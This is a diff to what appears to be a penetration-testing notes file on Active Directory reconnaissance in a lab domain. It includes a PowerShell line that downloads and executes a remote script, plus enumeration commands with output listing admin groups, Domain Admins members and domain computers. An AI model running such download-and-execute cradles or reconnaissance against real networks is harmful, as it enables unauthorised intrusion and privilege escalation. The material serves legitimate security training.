@@ -358,13 +358,13 @@ References:
 https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
 ```
 
-# Information Gathering 
+# Information Gathering with AD Module
 
-Domain Enumeration using AD Module
+Import AD module
 ```
 PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
-Get domain Info
+Get Domain info
 
 ```
 PS C:\Users\pparker> Get-ADDomain                                                                                       
@@ -552,6 +552,102 @@ PropertyCount      : 10
 
 ```
 
+Get *admin* groups in domian 
+
+```
+PS C:\Users\pparker> Get-ADGroup -Filter {name -like "*admin*"} | select name                                           
+Name
+----
+Administrators
+Hyper-V Administrators
+Storage Replica Administrators
+Schema Admins
+Enterprise Admins
+Domain Admins
+Key Admins
+Enterprise Key Admins
+DnsAdmins
+
+```
+
+Get users of Group Domain Admins
+```
+PS C:\Users\pparker> Get-ADGroupMember -Identity "Domain Admins" -Recursive                                             
+
+SamAccountName     : Administrator
+SID                : S-1-5-21-1806573636-3987246654-2051155295-500
+DistinguishedName  : CN=Administrator,CN=Users,DC=marvel,DC=local
+Name               : Administrator
+ObjectClass        : user
+ObjectGuid         : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
+PropertyNames      : {distinguishedName, name, objectClass, objectGUID...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 6
+
+SamAccountName     : spn1
+SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
+DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
+Name               : spn1
+ObjectClass        : user
+ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
+PropertyNames      : {distinguishedName, name, objectClass, objectGUID...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 6
+
+```
+
+Get User Groups 
+
+```
+PS C:\Users\pparker> Get-ADPrincipalGroupMembership -Identity spn1                                                      
+
+GroupScope         : Global
+GroupCategory      : Security
+SamAccountName     : Domain Users
+SID                : S-1-5-21-1806573636-3987246654-2051155295-513
+DistinguishedName  : CN=Domain Users,CN=Users,DC=marvel,DC=local
+Name               : Domain Users
+ObjectClass        : group
+ObjectGuid         : c5f46f7f-4f27-44cb-8787-3738c0d840cc
+PropertyNames      : {distinguishedName, GroupCategory, GroupScope, name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 8
+
+GroupScope         : Global
+GroupCategory      : Security
+SamAccountName     : Domain Admins
+SID                : S-1-5-21-1806573636-3987246654-2051155295-512
+DistinguishedName  : CN=Domain Admins,CN=Users,DC=marvel,DC=local
+Name               : Domain Admins
+ObjectClass        : group
+ObjectGuid         : cbb57bc7-d35c-4351-87a6-de121d3b3e7f
+PropertyNames      : {distinguishedName, GroupCategory, GroupScope, name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 8
+```
+
+Get all computers in the domain
+```
+PS C:\Users\pparker> Get-ADComputer -Filter * -Properties * | select name                                               
+Name
+----
+HYDRA
+PUNISHER
+DESKTOP-DGQM4HL
+SPODERMAN
+SPIDERMAN
+```
+
+
+# Other
 Extract RDP, Putty sessions form Registry:
 
 ```
